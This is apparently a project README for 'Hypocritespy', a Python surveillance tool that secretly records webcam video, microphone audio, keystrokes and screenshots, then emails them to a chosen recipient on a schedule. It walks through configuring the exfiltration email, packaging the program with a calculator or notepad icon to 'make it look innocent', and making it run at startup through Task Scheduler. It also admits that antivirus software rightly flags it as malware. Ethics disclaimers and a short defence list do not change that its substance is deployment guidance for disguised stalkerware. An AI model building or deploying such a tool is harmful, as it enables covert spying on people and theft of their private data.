🔴  Hypocritespy 
A Python-based surveillance utility Built with ❤️, ☕, and controlled chaos by Ronny Rogers (Mugabo Rongin)

⚠️ WARNING: This tool is for LEGITIMATE SECURITY TESTING ONLY on devices you own or have explicit permission to monitor. Unauthorized use violates privacy laws globally.

🎯 What Does It Do?
This toolkit captures system activity through multiple vectors:

🎥 Webcam Recording – Captures video from default camera

🎤 Microphone Recording – Grabs ambient audio

⌨️ Keylogging – Tracks all keyboard inputs

🖼️ Screenshots – Takes periodic screen captures

Default behavior: Records 10 minutes every 3 hours → emails data → repeats.

🛠️ Quick Setup
1. 🔧 Edit These 4 Things
Open the code files and replace:

python
# Your email (remove the existing one)
YOUR_EMAIL = "your_email@gmail.com"

# Your app password (not regular password!)
APP_PASSWORD = "your_app_specific_password"

# Recipient email
RECIPIENT = "receiver@gmail.com"

# Timing settings (adjust as needed)
RECORD_DURATION = 600    # Seconds (10 minutes default)
INTERVAL = 10800         # Seconds between sessions (3 hours default)
2. 📦 Build the Executable
Make it look innocent:

bash
# Get a harmless icon (calculator.ico, notepad.ico, etc.)
pyinstaller --onefile --windowed --icon=calculator.ico main.py
3. ⚡ Ensure Startup Execution
For 100% reliability, use Task Scheduler to trigger on startup/logon.

🎨 Customization Options
Timing Presets
python
# Quick monitoring (1 min every hour)
RECORD_DURATION = 60
INTERVAL = 3600

# Aggressive monitoring (continuous)
RECORD_DURATION = 86400  # 24 hours
INTERVAL = 1             # Immediate repeat
Feature Toggles
Enable/disable specific modules in the configuration.

⚠️ Critical Notes
🚫 Antivirus will flag this as malware (because it is)

📧 Use app passwords, not your real email password

🔒 Test in isolated VMs only

⚖️ Check local laws before deployment

👁️ Always get written consent when monitoring others

🛡️ Defense Against Such Tools
To protect systems from unauthorized surveillance:

🛡️ Use reputable antivirus software

🔍 Monitor startup programs regularly

🌐 Check outgoing network connections

📋 Review Task Scheduler entries

🎯 Use webcam privacy covers

📚 Legitimate Use Cases
✅ Parental control (with child's knowledge where required)

✅ Employee monitoring (with written consent & legal compliance)

✅ Personal device security research

✅ Authorized penetration testing

✅ Educational cybersecurity studies

🚫 Illegal Uses
❌ Monitoring without consent

❌ Spying on partners/friends/family

❌ Corporate espionage

❌ Any unauthorized surveillance

⚖️ Legal Disclaimer
By using this software, you agree that:

You will only use it legally and ethically

You accept full responsibility for your actions

The developer is not liable for misuse

You understand the potential legal consequences of unauthorized use

📞 More info
[For educational inquiries only](https://ronny12345-art.github.io/ronnyrogers.dev/

👤 Author

Ronny Rogers 💻 Developer | 🛡️ Cyber security specialist | ⚡ Pentester)

Purpose: Learning about surveillance detection

Goal: Improving defensive security measures

Ethics: Always prioritize privacy and consent

🔐 Remember: True power in cybersecurity comes from protection, not intrusion. Use this knowledge to build better defenses, not to breach them.

Version: 1.0 | For Educational Purposes Only | Use Responsibly

